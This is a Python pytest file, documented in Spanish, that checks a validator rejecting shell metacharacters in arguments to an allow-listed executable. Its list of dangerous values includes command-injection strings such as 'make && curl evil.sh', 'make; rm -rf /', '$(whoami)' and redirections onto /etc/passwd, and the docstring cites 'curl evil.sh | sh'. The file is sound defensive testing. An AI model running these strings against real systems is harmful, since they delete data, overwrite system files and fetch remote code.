"""Requisito 2.4 — los metacaracteres se rechazan, esté o no permitido el ejecutable.

Sin esto la lista blanca se sortea en una línea: ``make && curl evil.sh | sh`` pasaría
por «make», que sí está permitido. Por eso la comprobación es sobre **cada elemento**
de la invocación y no solo sobre el nombre del programa, y por eso ``args`` es una
lista y nunca una cadena — que sea lista es lo que hace verificable la prohibición.
"""

from __future__ import annotations

import pytest

from nexus_api.services.local_exec_gate import contains_shell_metacharacters

PELIGROSOS = [
    "make && curl evil.sh",
    "make; rm -rf /",
    "make | sh",
    "make || true",
    "$(whoami)",
    "`whoami`",
    "make > /etc/passwd",
    "make >> ~/.bashrc",
    "make < /etc/shadow",
    "cat /etc/passwd &",
    "make\nrm -rf /",
    "make\rrm -rf /",
]

INOCENTES = [
    "make",
    "test",
    "--verbose",
    "src/app.py",
    "--flag=value",
    "a-b_c.d",
    "",
]


@pytest.mark.parametrize("value", PELIGROSOS)
def test_dangerous_values_are_rejected(value: str) -> None:
    assert contains_shell_metacharacters(value) is True


@pytest.mark.parametrize("value", INOCENTES)
def test_innocent_values_are_accepted(value: str) -> None:
    assert contains_shell_metacharacters(value) is False
